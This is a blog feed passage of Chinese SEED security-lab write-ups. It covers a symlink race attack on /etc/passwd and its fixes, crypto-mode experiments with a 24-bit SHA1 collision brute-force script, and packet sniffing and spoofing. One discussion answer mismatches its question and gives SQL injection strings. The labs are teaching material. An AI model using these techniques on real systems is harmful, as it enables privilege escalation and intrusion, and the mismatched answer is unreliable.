<h4 id="Task-2-B：进行真实攻击"><a href="#Task-2-B：进行真实攻击" class="headerlink" title="Task 2.B：进行真实攻击"></a>Task 2.B：进行真实攻击</h4><p>在模拟攻击中，我们使用“ln-s”命令创建&#x2F;更改符号链接。现在我们需要在一个程序中进行。我们可以在 C 中使用 symlink() 来创建符号链接。由于 Linux 不允许在链接已经存在的情况下创建链接，因此我们需要先删除旧链接。下面的 C 代码片段显示了如何删除链接，然后使&#x2F;tmp&#x2F;XYZ 指向&#x2F;etc&#x2F;passwd。请编写你的攻击程序。如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140914093.png"></p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140915864.png"></p>
<p>我们需要多次运行漏洞程序，因此编写一个程序来自动执行此过程。为了避免手动向漏洞程序 vulp 键入输入，我们可以使用输入重定向。也就是说，我们将输入保存在一个文件中，并要求 vulp 使用“vulp &lt; inputFile”从该文件获取输入。我们也可以使用 pipe（稍后将给出一个示例）。该攻击可能需要一段时间才能成功修改口令文件，因此我们需要一种方法来自动检测攻击是否成功。很多方法可以满足此要求；一种简单的方法是监控文件的时间戳。下面的 shell 脚本运行“ls -l”命令，该命令输出关于文件的几条信息，包括上次修改的时间。通过将命令的输出与之前生成的输出进行比较，我们可以判断文件是否已被修改。以下 shell 脚本循环执行易受攻击的程序（vulp），输入由 echo 命令（通过一个 pipe）提供。你需要决定实际输入的内容。如果攻击成功，即 passwd 被修改，则 shell 脚本将停止。本任务需要一定的耐心，通常你能够在 5 分钟内成功。</p>
<p>执行攻击程序和脚本如下：</p>
<p>在攻击过程中，可以观察到XYZ文件的符号链接一直在被修改，说明程序执行成功，等待一段时候后：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140916090.png"></p>
<p>可以观察到攻击成功，可以以test用户身份登录并且验证root权限。</p>
<h4 id="Task-2-C：一种改进的攻击方法"><a href="#Task-2-C：一种改进的攻击方法" class="headerlink" title="Task 2.C：一种改进的攻击方法"></a>Task 2.C：一种改进的攻击方法</h4><p>首先创建两个符号链接&#x2F;tmp&#x2F;XYZ 和&#x2F;tmp&#x2F;ABC，然后使用 renameat2 系统调用来原子地交换它们。这允许我们在不引入任何竞争条件的情况下更改&#x2F;tmp&#x2F;XYZ 指向的内容。请使用此新策略修改你的攻击策略，然后重试攻击。如果一切正确，你的攻击应该能够成功</p>
<p>修改后的攻击程序如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140918310.png"></p>
<p>执行此攻击程序和脚本，结果如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140918449.png"></p>
<p>可以观察到攻击一次便成功，可以以test用户身份登录并且验证root权限。</p>
<h3 id="2-3-Task-3：预防措施"><a href="#2-3-Task-3：预防措施" class="headerlink" title="2.3 Task 3：预防措施"></a>2.3 Task 3：预防措施</h3><h4 id="Task-3-A：应用最小权限原则"><a href="#Task-3-A：应用最小权限原则" class="headerlink" title="Task 3.A：应用最小权限原则"></a>Task 3.A：应用最小权限原则</h4><p>本实验中，漏洞程序的根本问题是违反了最小权限原则。程序员考虑到运行程序的用户可能权限过高，所以他&#x2F;她引入了 access() 来限制用户的能力。然而，这不是正确的方法。更好的方法是应用最小权限原则；也就是说，如果用户不需要某些特权，则该特权需要被禁用。</p>
<p>我们可以使用 seteuid 系统调用暂时禁用 root 权限，然后在必要时启用它。请使用此方法修复程序中的漏洞，然后重复攻击。你能成功吗？请报告你的观察结果并提供解释。</p>
<p>修改漏洞程序如下图：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140919935.png"></p>
<p>重新对程序进行编译并且执行改进后的攻击程序和脚本，结果如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140919341.png"></p>
<p>发现攻击始终失败。解释如下：</p>
<p>调用open()函数的时候，没有root权限，因而无法打开&#x2F;tmp&#x2F;XYZ指向的受的文件passwd。</p>
<h4 id="Task-3-B：使用-Ubuntu-的内置方案"><a href="#Task-3-B：使用-Ubuntu-的内置方案" class="headerlink" title="Task 3.B：使用 Ubuntu 的内置方案"></a>Task 3.B：使用 Ubuntu 的内置方案</h4><p>Ubuntu 10.10 和更高版本附带了一个内置的防止竞争条件攻击的保护方案。在此任务中，你需要使用以下命令重新启用保护：</p>
<table>
<thead>
<tr>
<th>$ sudo sysctl -w fs.protected_symlinks&#x3D;1</th>
</tr>
</thead>
</table>
<p>执行该命令后，重新进行攻击，观察结果如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140920171.png"></p>
<p>发现攻击失败，此时XYZ文件的所有者已经成为root。</p>
<p>解释以下内容：</p>
<p>1. 该保护方案是如何工作的？</p>
<p>因为在这种情况下，XYZ文件的所有者是 root，tmp目录的所有者是 root，符号链接所有者是seed。 因而访问将被拒绝</p>
<p>2. 这个方案有什么局限性？</p>
<p>该机制仅适用于启用了粘滞位的目录，像 &#x2F;tmp 或 &#x2F;var&#x2F;tmp 这样的粘性位目录。 因此攻击者可以利用其他目录中的竞争条件并获得访问权限。</p>
<h3 id="2-4-思考题"><a href="#2-4-思考题" class="headerlink" title="2.4 思考题"></a>2.4 思考题</h3><p>最小权限原则可用于有效防御课程中讨论过的竞争条件攻击。我们可以使用相同的原理来阻止缓冲区溢出攻击吗？为什么？即在执行有缺陷的函数之前，我们禁用 root 权限；在函数返回后，我们重新启用特权。</p>
<p>答：仍然存在 SQL 注入问题。原因在于参数是可以拼接的， 可以在 eid 一项中输入如下内容： 008,256)’and 1&#x3D;1 # Passwd 中输入如下内容： 123,256)’and 1&#x3D;1 # 都可以成功实现 SQL 注入攻击</p>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>seedlab2.0</tag>
      </tags>
  </entry>
  <entry>
    <title>hello</title>
    <url>/2022/11/10/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>Crypto implementation Lab</title>
    <url>/2022/12/29/crypto_implementation/</url>
    <content><![CDATA[<h2 id="一-实验目的"><a href="#一-实验目的" class="headerlink" title="一.实验目的"></a>一.实验目的</h2><p>本实验的学习目标是让学生熟悉密钥加密与单向散列函数相关的概念。完成实验后，学生应该能够获得有关加密算法、加密模式、单向散列函数的第一手经验。此外，学生将能够使用工具和编写程序来加密&#x2F;解密消息，为给定的消息生成单向散列值。</p>
<span id="more"></span>
<p>开发人员在使用加密算法和模式时会犯许多常见的错误。这些错误会削弱加密的强度，并最终导致出现漏洞。本实验向学生展示一些错误，并要求学生发起攻击以利用这些漏洞。</p>
<p>1. 密钥加密。</p>
<p>2. 加密模式、初始向量（IV）和填充（Padding）。</p>
<p>3. 使用加密算法的常见错误。</p>
<p>4. 使用密码库进行编程。</p>
<h2 id="二-实验步骤与结果"><a href="#二-实验步骤与结果" class="headerlink" title="二.实验步骤与结果"></a>二.实验步骤与结果</h2><h3 id="2-1-Task-1：使用不同的密码算法和加密模式加密"><a href="#2-1-Task-1：使用不同的密码算法和加密模式加密" class="headerlink" title="2.1 Task 1：使用不同的密码算法和加密模式加密"></a>2.1 Task 1：使用不同的密码算法和加密模式加密</h3><p>在此任务中，我们将使用各种加密算法和模式。你可以使用以下openssl enc 命令来加密&#x2F;解密文件。要查看手册，你可以输入man openssl 和man enc。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150940491.png"></p>
<p>请将ciphertype 替换为特定的加密算法，例如-aes-128-cbc，-aes-128-cfb，-bf-cbc 等。这个任务，你应该尝试至少3 种不同的加密算法和模式组合。</p>
<p>实验步骤：</p>
<p>使用AES-128-CBC加密，解密，并与原文对比：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150941137.png"></p>
<p>使用AES-128-CFB加密，解密，并与原文对比：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150943523.png"></p>
<p>使用AES-128-OFB加密，解密，并与原文对比：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150943413.png"></p>
<h3 id="2-2-Task-2：加密模式：ECB-vs-CBC"><a href="#2-2-Task-2：加密模式：ECB-vs-CBC" class="headerlink" title="2.2 Task 2：加密模式：ECB vs. CBC"></a>2.2 Task 2：加密模式：ECB vs. CBC</h3><p>文件pic_original.bmp 包含一个简单的图片。我们想加密这张图片，所以没有加密密钥的人无法知道图片中的内容。请分别使用ECB（电子密码本）和CBC（密码块链接）模式加密文件。比如，你可以使用</p>
<p>• CBC 模式：-aes-128-cbc</p>
<p>• ECB 模式：-aes-128-ecb</p>
<p>然后执行以下操作：</p>
<p>（1）让我们将加密的图片视为图片，并使用图片查看软件来显示它。但是，对于.bmp 文件，前54 个字节包含有关图片的头部信息，我们必须正确设置它，因此加密文件可以被视为合法的.bmp 文件。我们将加密图片的头部替换为原始图片的头部。你可以使用十六进制编辑器工具（例如Bless）直接修改二进制文件。我们还可以使用以下命令从p1.bmp 中获取header，从p2.bmp 中获取数据（从偏移量55 到文件末尾），然后将header 和数据组合到一个新文件中。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150944992.png"></p>
<p>（2）使用任意图片查看软件显示加密图片。在ECB 模式和CBC 模式下，你分别能得到关于加密图片的原始图片的任何有用的信息吗？请解释你的观察。</p>
<p>实验步骤：</p>
<p>采用ECB模式加密如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150944553.png"></p>
<p>加密后的图片如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150945908.png"></p>
<p>采用CBC模式加密如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150945326.png"></p>
<p>加密后的图片如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150945977.png"></p>
<p>通过与原图的对比可以得知，在ECB模式加密后，得到的加密图片仍然可以得到原来图片的轮廓与形状，而通过CBC模式加密后，得到的加密图片完全是乱码无法得到关于原始图片任何有用的信息。</p>
<p>原因在于CBC模式每一次加密要将前一次的加密结果与加密内容进行异或，因此每一部分的加密前后不是一一对应的，即相同的明文块不会得到相同的密文块。而ECB模式中，不需要异或，相同的明文块会对应相同的密文块，因此图片的形状和轮廓依旧会保留。</p>
<h3 id="2-3-Task-3：错误传播–-被破坏的密文"><a href="#2-3-Task-3：错误传播–-被破坏的密文" class="headerlink" title="2.3 Task 3：错误传播– 被破坏的密文"></a>2.3 Task 3：错误传播– 被破坏的密文</h3><p>为了理解各种工作模式的在错误传播上的性质，请做以下练习：</p>
<p>1. 创建一个至少1000 字节长的文本文件。</p>
<p>2. 使用AES-128 算法加密文件。</p>
<p>3. 不幸的是，加密文件中第55 个字节的某一个bit 已损坏。你可以使用bless 十六进制编辑器来破坏该文件。</p>
<p>4. 使用正确的密钥和IV 解密损坏的密文文件。</p>
<p>请回答以下问题：如果工作模式是ECB 或CBC ，你分别能从解密后的损坏文件中恢复出多少信息？</p>
<p>请在做这个任务之前回答这个问题，然后在完成此任务之后看看你的答案是否正确。给出你的理由。</p>
<blockquote>
<p>ECB模式将只有第四组解密错误<br>CBC模式将有第四组与第五组的解密错误</p>
</blockquote>
<p>实验步骤：</p>
<p>首先创建一个1000字节长的文本文件如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150948393.png"></p>
<p>采用ECB模式加密后得到如下文件：</p>
<p>其中第55字节为E1</p>
<p>对应二进制位1110 0001</p>
<p>修改为A1</p>
<p>对应二进制位1010 0001</p>
<p>然后再进行解密</p>
<p>如下图：</p>
<p>修改前：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150949685.png"></p>
<p>修改后：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150949796.png"></p>
<p>解密后：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150950216.png"></p>
<p>可以观察到只有第四轮的明文改变</p>
<p>CBC模式同理：</p>
<p>如下图：</p>
<p>修改前：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150950735.png"></p>
<p>修改后：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150950083.png"></p>
<p>解密结果：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150951870.png"></p>
<p>可以观察到第四轮的明文改变，以及第五轮的第七位发生改变</p>
<p>实验结果与预期结果相同</p>
<h3 id="2-4-Task-4：寻找密钥"><a href="#2-4-Task-4：寻找密钥" class="headerlink" title="2.4 Task 4：寻找密钥"></a>2.4 Task 4：寻找密钥</h3><p>你得到一个明文和一个密文，你知道aes-128-cbc 用于从明文生成密文。你得到的另一条线索是，加密此明文使用的密钥是一个少于16 个字符的英语单词。这个单词可以从英语字典中找到。由于这个单词少于16 个字符（即128 bits ）1，在单词的结尾附加了一些井号（#：十六进制值是0x23）构成一个128bits 的密钥。</p>
<p>你的目标是编写一个程序来找出这个密钥，你可以使用任意的编程语言（如Java、C、Shell）来实现你的分析。你也可以在程序中直接调用OpenSSL 命令来使用加密算法。你可以从Internet 下载英文单词列表，我们也提供了一个：words.txt。</p>
<p>明文、密文和IV 如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150952866.png"></p>
<p>实验步骤如下：</p>
<p>编写脚本如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150952399.png"></p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150953849.png"></p>
<p>执行该脚本，即可得到密钥如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150953495.png"></p>
<h3 id="2-5-Task-5：生成消息摘要"><a href="#2-5-Task-5：生成消息摘要" class="headerlink" title="2.5 Task 5：生成消息摘要"></a>2.5 Task 5：生成消息摘要</h3><p>在此任务中，我们将使用各种哈希算法。。你可以使用以下openssl dgst 命令生成文件的哈希值。</p>
<table>
<thead>
<tr>
<th>$ openssl dgst dgsttype filename</th>
</tr>
</thead>
</table>
<p>请使用特定的哈希算法替换dgsttype，例如-md5，-sha1，-sha256 等。在此任务中，你应该尝试至少3 种不同的算法，并描述你的观察。你可以通过键入“man dgst”找到支持的哈希算法。</p>
<p>我们提供了一个（明文）文本文件用作测试：plain.txt</p>
<p>步骤如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150953790.png"></p>
<p>分别使用md5，sha1，sha256进行加密，可以观察得到了不同长度的十六进制字符串。</p>
<h3 id="2-6-Task-6：哈希函数的输出特性"><a href="#2-6-Task-6：哈希函数的输出特性" class="headerlink" title="2.6 Task 6：哈希函数的输出特性"></a>2.6 Task 6：哈希函数的输出特性</h3><p>要了解哈希函数的输出特性，我们希望对SHA1 执行以下练习：</p>
<p>1. 使用SHA1 算法为plain.txt 生成哈希值H1。</p>
<p>2. 修改输入文件的一位。你可以使用Bless 来完成此修改。</p>
<p>3. 为修改后的文件生成哈希值H2。</p>
<p>请观察H1 和H2 是否相似。请在实验报告中描述你的观察结果。</p>
<p>实验步骤：</p>
<p>使用SHA1算法加密plain.txt后，得到结果如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150955724.png"></p>
<p>修改文件的内容中第一个字节中的第一个bit</p>
<p>初始为49，二进制为：0100 1001</p>
<p>修改后为C9，二进制为：1100 1001</p>
<p>如下图所示：</p>
<p>修改前：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150956539.png"></p>
<p>修改后：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150956032.png"></p>
<p>重新采用SHA1算法进行，加密得到结果如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150956766.png"></p>
<p>对比前后两次的哈希结果：</p>
<p>修改前：8d3b090efe42d1344c7d6d60a534a7f525e2b2e7</p>
<p>修改后：6711dd03a1332377c155d81f713b4ea78c306ebf</p>
<p>可以发现两次的结果只有长度相同，在内容上完全不同，没有任何关联。由于任何一比特的改变都使得了输出结果的不同，保证了哈希算法的抗碰撞特性。</p>
<h3 id="2-7-Task-7：单向性与抗碰撞性"><a href="#2-7-Task-7：单向性与抗碰撞性" class="headerlink" title="2.7 Task 7：单向性与抗碰撞性"></a>2.7 Task 7：单向性与抗碰撞性</h3><p>哈希函数的具有单向性与抗碰撞性。在这个实验里我们将使用暴力穷举方法来测试抗碰撞性，即找到具有相同哈希值的两个文件。你的目标是，在给定一个文件，编写一个程序来找出另一个具有相同哈希值的文件，你可以使用任意的编程语言（如Java、C、Shell）来实现你的分析。你可以在程序中直接调用OpenSSL 命令来使用哈希算法。</p>
<p>由于大多数哈希函数的抗碰撞性的抵御暴力攻击的能力非常强大，因此使用暴力穷举方法攻破它们需要数年时间。为了使任务可行，我们将哈希值的长度减少到24 位。我们在此任务中只使用SHA1 哈希值的前24 位。即，可以理解成我们使用修改过的单向散列函数。请设计一个程序，找出以下内容：</p>
<p>1. 计算original.txt 的SHA1 哈希值，并记录前24 位。</p>
<p>2. 使用暴力穷举方法（生成随机字符串），找到另外一个文件与上述文件具有相同的哈希值（前24 位）。</p>
<p>实验步骤如下：</p>
<p>首先计算original.txt 的SHA1 哈希值，得到其前24位如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150957889.png"></p>
<p>根据得到的前24位哈希值，编写脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> strgen <span class="keyword">import</span> StringGenerator <span class="keyword">as</span> SG</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    random_str = SG(<span class="string">r&quot;[\w]&#123;17&#125;&quot;</span>).render()</span><br><span class="line">    hash_str = sha1(random_str.encode())</span><br><span class="line">    hex_hash_str = hash_str.hexdigest()</span><br><span class="line">    count = count + <span class="number">1</span></span><br><span class="line">    <span class="comment"># print(random_str)</span></span><br><span class="line">    <span class="comment"># print(&quot;The hexadecimal equivalent of SHA1 is : &quot;)</span></span><br><span class="line">    <span class="comment"># print(hex_hash_str[0:6])</span></span><br><span class="line">    <span class="keyword">if</span> hex_hash_str[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&quot;4dc981&quot;</span>:</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Find same hash in 24 bits&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Random_str is :&quot;</span>,random_str)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;SHA1 is :&quot;</span>,hex_hash_str)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Count is :&quot;</span>,count)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Cost time:&quot;</span>,end-start)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>执行该脚本得到结果如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151001240.png"></p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151001961.png"></p>
<p>此处生成的随机字符串长度同original.txt，有17位，得到五次碰撞如下：</p>
<table>
<thead>
<tr>
<th>原文</th>
<th>密文</th>
<th>次数</th>
</tr>
</thead>
<tbody><tr>
<td>iVs3Kjk18KlBgu10v</td>
<td>4dc9817f10edf31eb2e76bdce63d071944615297</td>
<td>4519964</td>
</tr>
<tr>
<td>x2vwXgg5_VTg8FjfM</td>
<td>4dc9815669519a61e1ace2eb8c7081f4c8f3c868</td>
<td>19477619</td>
</tr>
<tr>
<td>xj10d3J7L38qP0L70</td>
<td>4dc9812411f31e743a50506bb77a43d476d5d7c6</td>
<td>33590917</td>
</tr>
<tr>
<td>jQKpQ8kVkFzhyJQBc</td>
<td>4dc98181cd118240664148ba948fff0be73c2fbe</td>
<td>15379182</td>
</tr>
<tr>
<td>rkYx0Se0m93vqeyXb</td>
<td>4dc98131481a7bdc3fa0d6bc391fa8a06e2513c8</td>
<td>19913632</td>
</tr>
</tbody></table>
<p>平均碰撞次数：18576262.8次</p>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>seedlab2.0</tag>
      </tags>
  </entry>
  <entry>
    <title>PACKET SPOFFING AND SNIFFING PROJECT</title>
    <url>/2022/10/02/sniff_spoof/</url>
    <content><![CDATA[<h2 id="一-实验目标"><a href="#一-实验目标" class="headerlink" title="一.实验目标"></a>一.实验目标</h2><p>本实验的目标有两个方面：学习使用这些工具(Wireshark,Tcpdump,Netwox,Scapy)和了解这些工具背后的技术。对于第二个任务，将编写简单的嗅探器和欺骗程序，并获得深入了解这些程序的技术方面。</p>
<span id="more"></span>
<p>本实验涵盖以下主题：</p>
<p>• 嗅探和欺骗的工作原理</p>
<p>• 使用pcap库和Scapy进行数据包嗅探</p>
<p>• 使用原始套接字和Scapy进行数据包欺骗</p>
<p>• 使用Scapy操作数据包</p>
<h2 id="二-实验原理"><a href="#二-实验原理" class="headerlink" title="二.实验原理"></a>二.实验原理</h2><p>Sniffing就是一种能将本地网卡状态设成‘混杂’状态的模式，当网卡处于这种“混杂”方式时，该网卡具备“广播地址”，它对遇到的每一个帧都产生一个硬件中断以便提醒操作系统处理流经该物理媒体上的每一个报文包。（绝大多数的网卡具备置成混杂模式的能力）</p>
<p>一般来说，sniffing和poofing会联合起来使用。当攻击者嗅探到关键信息时，通常会使用poofing技术来构造数据包来劫持会话或者去获取更多信息，通常会造成很大的危害。Poofing技术就是攻击者自己构造数据包的ip&#x2F;tcp数据包帧头部数据来达到自己的目的。</p>
<p>本次实验就是基于以上原理，在linux下模拟整个过程。</p>
<h2 id="三-实验器材"><a href="#三-实验器材" class="headerlink" title="三.实验器材"></a>三.实验器材</h2><p>1．Ubuntu12.04。</p>
<p>2．Wireshark等常用捕包工具。</p>
<h2 id="四-实验步骤及运行结果"><a href="#四-实验步骤及运行结果" class="headerlink" title="四.实验步骤及运行结果"></a>四.实验步骤及运行结果</h2><h3 id="4-1-Lab-Task-Set-1-Using-Tools-to-Sniff-and-Spoof-Packets"><a href="#4-1-Lab-Task-Set-1-Using-Tools-to-Sniff-and-Spoof-Packets" class="headerlink" title="4.1 Lab Task Set 1: Using Tools to Sniff and Spoof Packets"></a>4.1 Lab Task Set 1: Using Tools to Sniff and Spoof Packets</h3><h4 id="4-1-1-Task-1-1-Sniffing-Packets"><a href="#4-1-1-Task-1-1-Sniffing-Packets" class="headerlink" title="4.1.1 Task 1.1: Sniffing Packets"></a>4.1.1 Task 1.1: Sniffing Packets</h4><p>Task 1.1A 上述程序嗅探数据包。对于每个捕获的数据包，回调函数打印 pkt（）将被调用;此函数将打印出有关数据包的一些信息。运行程序根权限，并证明您确实可以捕获数据包。之后，再次运行该程序，但不使用根权限;描述并解释您的观察结果。</p>
<p>运行结果：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180928374.png"></p>
<p>运行sniff时，在主机A中ping主机B可以截取到如上数据包</p>
<p>如果关掉root在用户状态下运行，会得到如下报错：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180929019.png"></p>
<p>解释：普通用户没用权限执行sniff程序。</p>
<p>Task 1.1B. 通常，当我们嗅探数据包时，我们只对某些类型的数据包感兴趣。我们可以做到通过在嗅探中设置过滤器。斯卡皮的过滤器使用BPF（伯克利数据包过滤器）语法;您可以找到来自互联网的 BPF 手册。请设置以下过滤器并再次演示您的嗅探器程序（每个过滤器应单独设置）：</p>
<p>仅仅捕获ICMP数据包（Task 1.1A中已经实现）</p>
<p>捕获来自于特定IP地址的TCP数据包并且目的端口号为23</p>
<p>首先在过滤器中对过滤规则进行更改如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180929023.png"></p>
<p>然后了解到23端口作用如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180930609.png"></p>
<p>可以在主机A中执行telnet 10.9.0.6 命令，并且执行sniff程序得到如下结果：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180930385.png"></p>
<p>捕获来自于指定子网的数据包</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180930502.png"></p>
<p>设置过滤器规则如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180931164.png"></p>
<p>捕获到数据包如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180931117.png"></p>
<h4 id="4-1-2-Task-1-2-Spoofing-ICMP-Packets"><a href="#4-1-2-Task-1-2-Spoofing-ICMP-Packets" class="headerlink" title="4.1.2 Task 1.2: Spoofing ICMP Packets"></a>4.1.2 Task 1.2: Spoofing ICMP Packets</h4><p>在attacker主机中利用虚拟机本地网卡enps03发送伪造数据包，并且利用wireshark进行数据包的截获得到如下结果，可以看到伪造成功。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180931600.png"></p>
<h4 id="4-1-3-Task-1-3-Traceroute"><a href="#4-1-3-Task-1-3-Traceroute" class="headerlink" title="4.1.3 Task 1.3: Traceroute"></a>4.1.3 Task 1.3: Traceroute</h4><p>攻击者主机中对ping baidu.com 进行定位计算机和目标计算机之间的所有路由器。分别修改程序中的ttl为3，4，5可以得到如下运行结果：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180932040.png"></p>
<h4 id="4-1-4-Sniffing-and-then-Spoofing"><a href="#4-1-4-Sniffing-and-then-Spoofing" class="headerlink" title="4.1.4 Sniffing and-then Spoofing"></a>4.1.4 Sniffing and-then Spoofing</h4><p>单独在主机B中ping 8.8.8.8 可以观察到如下结果：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180932464.png"></p>
<p>利用Scapy编写好伪造程序后在攻击者主机中进行运行，同时再次利用主机B进行ping 8.8.8.8 的命令，可以得到如下运行结果：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180933091.png"></p>
